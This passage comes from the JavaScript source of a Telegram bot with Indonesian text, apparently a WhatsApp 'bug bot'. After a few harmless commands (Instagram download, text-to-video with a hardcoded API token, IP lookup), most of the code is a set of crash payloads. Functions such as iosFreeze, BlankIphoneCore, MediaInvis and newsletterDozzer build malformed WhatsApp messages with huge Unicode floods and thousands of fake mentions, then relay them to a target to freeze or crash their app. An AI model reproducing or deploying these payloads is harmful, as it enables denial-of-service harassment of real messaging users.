            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        // Jika ada video
        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        // Jika hanya gambar
        else if (data.result.image) {
            await bot.sendPhoto(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});


bot.onText(/^\/(cvid|veo3)(?:\s+(.+))?$/i, async (msg, match) => {
   const chatId = msg.chat.id;
   const command = match[1]; // cvid atau veo3
   const text = match[2] || '';
   const userId = msg.from.id;
   const randomImage = getRandomImage();
   const senderId = msg.from.id;
   const isPremium = await premium (senderId);
   const chatType = msg.chat.type;
          
  if (isGroupOnly() && chatType === 'private') {
  return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/cvid')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
    if (!text) {
        return bot.sendMessage(chatId, 'Masukkan prompt untuk membuat video!\nContoh: /' + command + ' A pixel-art queen in her throne room');
    }

    // Kirim pesan sedang memproses
    const processingMsg = await bot.sendMessage(chatId, '⏳ Sedang membuat video dari teks... Jangan berharap terlalu tinggi 😅');

    try {
        const prompt = text;
        const auth = 'eyJzdWIiwsdeOiIyMzQyZmczNHJ0MzR0weMzQiLCJuYW1lIjorwiSm9objMdf0NTM0NT';

        // Step 1: Request pembuatan video
        const { data: keyData } = await axios.post('https://soli.aritek.app/txt2videov3', {
            deviceID: Math.random().toString(16).substr(2, 8) + Math.random().toString(16).substr(2, 8),
            prompt: prompt,
            used: [],
            versionCode: 51
        }, {
            headers: {
                authorization: auth,
                'content-type': 'application/json; charset=utf-8',
                'accept-encoding': 'gzip',
                'user-agent': 'okhttp/4.11.0'
            }
        });

        // Step 2: Ambil video yang sudah dibuat
        const { data } = await axios.post('https://soli.aritek.app/video', {
            keys: [keyData.key]
        }, {
            headers: {
                authorization: auth,
                'content-type': 'application/json; charset=utf-8',
                'accept-encoding': 'gzip',
                'user-agent': 'okhttp/4.11.0'
            }
        });

        const videoUrl = data.datas[0]?.url;
        if (!videoUrl) {
            await bot.deleteMessage(chatId, processingMsg.message_id);
            return bot.sendMessage(chatId, '❌ Tidak ditemukan video.');
        }

        // Hapus pesan processing dan kirim video
        await bot.deleteMessage(chatId, processingMsg.message_id);
        
        await bot.sendVideo(chatId, videoUrl, {
            caption: `🎬 Hasil Text to Video:\n"${prompt}"`,
            reply_to_message_id: msg.message_id
        });

    } catch (error) {
        console.error('Error:', error);
        
        // Hapus pesan processing
        try {
            await bot.deleteMessage(chatId, processingMsg.message_id);
        } catch (deleteError) {
            console.error('Gagal menghapus pesan processing:', deleteError);
        }
        
        await bot.sendMessage(chatId, '❌ Gagal membuat video dari teks.', {
            reply_to_message_id: msg.message_id
        });
    }
});


async function uploadToCatbox(fileBuffer, filename) {
  const form = new FormData();
  form.append("reqtype", "fileupload");
  form.append("fileToUpload", new Blob([fileBuffer]), filename);

  const res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: form,
  });

  const text = await res.text();
  if (!res.ok || text.startsWith("ERROR")) {
    throw new Error("Upload gagal: " + text);
  }
  return text.trim();
}


bot.onText(/^\/cekip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const ip = match[1]?.trim();
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
           
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/cekip')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }

  // Validasi IP address
  if (!ip || !/^\d{1,3}(\.\d{1,3}){3}$/.test(ip)) {
    return bot.sendMessage(
      chatId,
      "❌ *IP tidak valid!*\n\nContoh penggunaan:\n`/cekip 8.8.8.8`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    await bot.sendChatAction(chatId, "typing");

    const res = await axios.get(`https://ipwho.is/${ip}`);
    const data = res.data;

    if (!data.success) {
      return bot.sendMessage(chatId, "❌ *IP tidak ditemukan atau tidak valid!*", {
        parse_mode: "Markdown",
      });
    }

    const {
      ip: ipAddress,
      continent,
      country,
      country_code,
      region,
      city,
      org,
      timezone,
      latitude,
      longitude,
    } = data;

    const gmapsUrl =
      latitude && longitude
        ? `🔗 *Google Maps:* [Klik di sini](https://maps.google.com/maps?q=${latitude},${longitude})`
        : "🔗 *Google Maps:* Tidak tersedia";

    const result = `📡 *IP WHOIS Lookup*
━━━━━━━━━━━━━━━━━━━━
🌐 *IP:* ${ipAddress}
🧭 *Continent:* ${continent || "-"}
🏳️ *Country:* ${country || "-"} (${country_code || "-"})
🏙️ *Region:* ${region || "-"}
📍 *City:* ${city || "-"}
🏢 *ISP:* ${org || "-"}
⏰ *Timezone:* ${timezone?.id || "-"}
📌 *Latitude:* ${latitude || "-"}
📌 *Longitude:* ${longitude || "-"}
${gmapsUrl}
━━━━━━━━━━━━━━━━━━━━`;

    return bot.sendMessage(chatId, result, {
      parse_mode: "Markdown",
      disable_web_page_preview: true,
    });

  } catch (err) {
    console.error("Error /cekip:", err.message || err);
    return bot.sendMessage(chatId, "❌ *Terjadi kesalahan saat mengambil data IP!*", {
      parse_mode: "Markdown",
    });
  }
});

//---------------( FUNCTION INVIS IOS  )----------------\\
async function TrashLocIoSInVis(sock, target) {
  const x = 60000;
  const locationMessage = {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: " GHOST PRIDE 🩸. " 
      + "\u0000".repeat(x) 
      + "𑇂𑆵𑆴𑆿".repeat(x),
      address: "https://hanz",
      contextInfo: {
        externalAdReply: {
          title: "𑇂𑆵𑆴𑆿".repeat(x),
          body: "𑇂𑆵𑆴𑆿".repeat(x),
          mediaType: 1,
          thumbnailUrl: "https://example.com/thumb.jpg",
          sourceUrl: "https://t.me/rizxvelzexct",
          mediaUrl: "https://example.com/media.jpg"
        }
      }
    }
  };

  try {
    const msg = await generateWAMessageFromContent("status@broadcast", {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            locationMessage: locationMessage.locationMessage
          }
        }
      },
      {}
    );

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      }
    );

    await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "#Location?-💰" },
            content: undefined
          }
        ]
      }
    );

    console.log(chalk.green("Success Send Bug Location To Status By Syonx£hiro"));
  } catch (error) {
    console.error("Error sending message:", error);
  }
}
async function IosInvis(target) {
  try {
    const IosInvis = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -6.2088,
            degreesLongitude: 106.856,
            name: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸\\>🍷𞋯" + "𑇂𑆵𑆴𑆿".repeat(29629),
            address: "𑇂𑆵𑆴𑆿".repeat(1851),
            contextInfo: {
              mentionedJid: Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              ),
              isSampled: true,
              participant: target,
              remoteJid: target,
              forwardingScore: 9890,
              isForwarded: true
            }
          }
        }
      }
    };
    
    const msg = generateWAMessageFromContent(target, IosInvis, {});
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error("Error di:", err);
  }
}

//---------------( FUNCTION BLANK IOS  )----------------\\
async function iosFreeze(target, Ptcp = true) {
   let anjayalokmwkakaakak = "GHOST PRIDE 🩸" + "ြ".repeat(25000) + "@1".repeat(60000);
   await iSreyy.relayMessage(target, {
         messages: {
            Exentedtextmesage: {
               message: {
                  documentMessage: {
                     url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                     mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                     fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                     fileLength: "999999999",
                     pageCount: 0x9184e729fff,
                     mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                     fileName: "NtahMengapa..",
                     fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                     directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                     mediaKeyTimestamp: "1715880173",
                     contactVcard: true
                  },
                  title: "",
                  hasMediaAttachment: true
               },
               body: {
                  text: anjayalokmwkakaakak
               },
               nativeFlowMessage: {},
               contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "0@newsletter"),
          }
         }
      }
   }, { participant: { jid: mentionedJid, target } }, { messageId: null });
}

async function freezeIphone(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 9999999471,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
async function BlankIphoneCore(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "GHOST PRIDE 🩸" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await sock.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}


//---------------( FUNCTION KOUTA  )----------------\\
async function MediaInvis(target) {
  try {
    const stickerPayload = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            isAnimated: true,
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };

    const audioPayload = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };

    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "Awas Air Panas",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "Awas Air Panas",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
    };

    const msg1 = generateWAMessageFromContent(target, stickerPayload, {});
    const msg2 = generateWAMessageFromContent(target, audioPayload, {});
    const msg3 = generateWAMessageFromContent(target, imagePayload, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error("❌ Error di:", err);
  }
}



async function tes10(sock, target) {
    const config = {
        sessionId: "5e03e0",
        mediaKey: "10000000_2203140470115547_947412155165083119_n.enc",
        bufferHash: "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
        mimeType: "image/webp"
    };

    let parserState = true;
    if (11 > 9) parserState = !parserState;

    const mention = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1998 }, () => 
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
        )
    ];
    
    const PayloadGeweh = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: `https://mmg.whatsapp.net/v/t62.43144-24/${config.mediaKey}?ccb=11-4&oh=${config.bufferHash}=68917910&_nc_sid=${config.sessionId}&mms3=true`,
                    fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
                    fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
                    mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
                    mimetype: config.mimeType,
                    directPath: `/v/t62.43144-24/${config.mediaKey}?ccb=11-4&oh=${config.bufferHash}=68917910&_nc_sid=${config.sessionId}`,
                    fileLength: {
                        low: Math.floor(Math.random() * 1000),
                        high: 0,
                        unsigned: true,
                    },
                    mediaKeyTimestamp: {
                        low: Math.floor(Math.random() * 1700000000),
                        high: 0,
                        unsigned: false,
                    },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    contextInfo: {
                        participant: target,
                        mentionedJid: mention,
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                    },
                    stickerSentTs: {
                        low: Math.floor(Math.random() * -20000000),
                        high: 555,
                        unsigned: parserState,
                    },
                    isAvatar: parserState,
                    isAiSticker: parserState,
                    isLottie: parserState,
                },
            },
        },
    };

    try {
        const generatedMessage = generateWAMessageFromContent(target, PayloadGeweh, {});
        
        await sock.relayMessage("status@broadcast", generatedMessage.message, {
            messageId: generatedMessage.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        });

        console.log(`✅ Sticker exploit terkirim ke status ${target}`);

    } catch (error) {
        console.log(`❌ Gagal mengirim exploit:`, error.message);
    }
}


async function newsletterDozzer(sock, target) {
   
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸" + "ោ៝".repeat(20000),
      caption: "GHOST PRIDE 🩸" + "ោ៝".repeat(10000) + "ោ៝".repeat(20000),
      inviteExpiration: "999999999",
    },
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });

  const message2 = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: sock.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "\n\n\n\n\nx\n\n\n\n\n",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: ""
                    },
                },
              },
            body: {
              text: "GHOST PRIDE 🩸" + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "{}".repeat(1000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}".repeat(1000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "{}".repeat(1000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "{}".repeat(1000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "{}".repeat(1000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "{}".repeat(1000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "{}".repeat(1000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "{}".repeat(1000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "{}".repeat(1000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "{}".repeat(1000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "{}".repeat(1000),
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(target, message2, {
      participant: { jid: target },
    });
}
//---------------( FUNCTION NOTIP  )----------------\\
async function BlankNotif(target, ptcp = true) {
      let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
           message: {
              interactiveMessage: {
                header: {
                documentMessage: {
                url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                    mimetype: 'ꦽ'.repeat(10000),
                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                   fileLength: "999999999",
                   pageCount: 0x9184e729fff,
                   mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  fileName: "Xavienz.doc",
                  fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
               mediaKeyTimestamp: "1715880173",
                contactVcard: true,
                jpegThumbnail: null,
              },
                 title: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸",
                  hasMediaAttachment: true
               },
                 body: {
                 text: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸" + "ꦽ".repeat(95000) + "ꦾ".repeat(50000),
                },
               nativeFlowMessage: {
                messageParamsJson: "{}".repeat(10000),
                 buttons: [
               {
                   name: "galaxy_message",
                   buttonParamsJson: JSON.stringify({
                   display_text: "ꦽ".repeat(10000),
                  })
             },
             {
                   name: "send_location",
                   buttonParamsJson: JSON.stringify({
                   display_text: "ꦽ".repeat(10000),
                  })
             },
             {
                   name: "call_permission_request",
                   buttonParamsJson: JSON.stringify({
                   display_text: "ꦽ".repeat(10000),
                  })
                 }
               ]
             }
           }
         }
       }
   }, {});            
   await sock.relayMessage(target, msg.message, ptcp ? {
	  participant: {
	  jid: target
	}
 } : {});
   console.log(chalk.red(`Succes Sending Bug To ${target}`));
 }
async function notifblank5(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸"
          },
          nativeFlowMessage: {
            messageParamsJson: "{}",
            buttons: [
              {
                name: "templateMessage",
                buttonParamsJson: "{}"
              },
              {
                name: "payment_method",
                buttonParamsJson: "{}"
              },
              {
                name: "payments_care_csat",
                buttonParamsJson: "{}"
              },
              {
                name: "automated_greeting_message_view_catalog",
                buttonParamsJson: "{}"
              },
              {
                name: "message_with_link_status",
                buttonParamsJson: "{}"
              },
              {
                name: "extensions_message_v2",
                buttonParamsJson: "{}"
              },
              {
                name: "landline_call",
                buttonParamsJson: "{}"
              },
              {
                name: "wa_payment_fbpin_reset",
                buttonParamsJson: "{}"
              },
              {
                name: "wa_payment_transaction_details",
                buttonParamsJson: "{}"
              },
              {
                name: "wa_payment_learn_more",
                buttonParamsJson: "{}"
              },
              {
                name: "form_message",
                buttonParamsJson: "{}"
              },
              {
                name: "mpm",
                buttonParamsJson: "{}"
              },
            ],
          }
        }
      }
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

//---------------( FUNCTION BLANK KLIK )---------------\\
async function Semesta(target) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸" + 
            "ꦽ".repeat(500) + 
            "ꦾ".repeat(4000),
            jpegThumbnail: "https://files.catbox.moe/qbdvlw.jpg",
            caption: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸" + "ꦾ".repeat(4000),
            inviteExpiration: Date.now() + 9999999999,
          },
        },
      },
      
      contextInfo: {
        remoteJid: target,
        participant: target,
        stanzaId: sock.generateMessageTag(),
      },
    };

    await sock.relayMessage(target, message, {
      userJid: target,
    });
  } catch (error) {
    console.log("error:\n" + error);
  }
}



//---------------( FUNCTION FORCE CLICK  )----------------\\
async function StickForclose(sock, target) {
  const stickerPayload = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
          fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
          mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
          mimetype: "image/webp",
          height: 9999,
          width: 9999,
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          fileLength: 12260,
          mediaKeyTimestamp: "1743832131",
          isAnimated: false,
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            participant: target,
            mentionedJid: [
              target,
              ...Array.from(
                { length: 1850 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, stickerPayload, {});

  if (Math.random() > 0.5) {
